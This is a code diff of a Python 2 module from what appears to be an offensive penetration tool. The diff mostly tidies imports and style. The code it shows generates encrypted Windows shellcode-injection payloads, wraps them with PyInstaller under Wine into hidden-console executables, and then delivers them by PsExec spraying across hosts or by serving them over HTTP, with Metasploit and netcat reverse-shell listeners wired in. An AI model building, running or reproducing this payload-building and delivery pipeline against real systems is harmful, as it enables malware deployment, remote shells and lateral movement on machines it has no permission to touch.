@@ -1,12 +1,17 @@
-from main import *
-from payloadextras import *
-from psexecspray import *
-from startmetasploit import *
-from generatepayload import *
-from menu import *
-from encrypt import *
-from stager import *
+from startmetasploit import METASPLOIT
+from main import Spinner, payloaddir, injectwindows, DoServe
+from psexecspray import DoPsexecSpray
+from payloadextras import EXTRAS
+from encrypt import do_Encryption
+import os
+import blessed
+import sys
+import time
+import string
+import random
+import subprocess
 
+t = blessed.Terminal()
 
 METASPLOIT_Functions = {
     'reverse': {
@@ -37,6 +42,8 @@ METASPLOIT_Functions = {
         'nclisten': METASPLOIT().nclisterner,
     }
 }
+
+
 def askAndReturnModules(shellcode, metasploit_type):
     if metasploit_type == 'nclistener':
         return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['nclisten'])
@@ -58,7 +65,8 @@ def askAndReturnModules(shellcode, metasploit_type):
 
         return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])
 
-def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
+
+def GeneratePayload(ez2read_shellcode, payloadname, shellcode):
     from menu import clientMenuOptions
     if len(clientMenuOptions.keys()) > 2:
         from stager import clientUpload
@@ -67,14 +75,14 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
 
     randoFileName = ''.join(random.sample(string.ascii_lowercase, 8))
     with open('%s/%s.py' % (payloaddir(), randoFileName), 'w+') as Filesave:
-        Filesave.write(do_Encryption(SHELLCODE.injectwindows % (ez2read_shellcode)))
+        Filesave.write(do_Encryption(injectwindows % (ez2read_shellcode)))
         Filesave.close()
     print '[*] Creating Payload using Pyinstaller...'
 
     p = subprocess.Popen(['wine', os.path.expanduser('~') + '/.win32/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
                           '%s/%s.py' % (payloaddir(), randoFileName), '--noconsole', '--onefile'], env=dict(os.environ, **{'WINEARCH':'win32','WINEPREFIX':os.path.expanduser('~') + '/.win32'}), bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     LOADING = Spinner('Generating Payload')
-    while p.poll() == None:
+    while p.poll() is None:
         LOADING.Update()
         time.sleep(0.2)
     print '\r',
@@ -103,6 +111,7 @@ def CleanUpPayloadMess(randoFileName):
     os.system('rm *.spec')
     os.system('rm %s/%s.py' % (payloaddir(), randoFileName))
 
+
 def DoPayloadUpload(payloadname):
     from menu import returnIP
     want_to_upload = raw_input(
@@ -110,4 +119,4 @@ def DoPayloadUpload(payloadname):
     if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
         DoPsexecSpray(payloaddir() + '/' + payloadname + '.exe')
     elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
-        FUNCTIONS().DoServe(returnIP(), payloadname, payloaddir(), port=8000, printIt = True)
+        DoServe(returnIP(), payloadname, payloaddir(), port=8000, printIt=True)
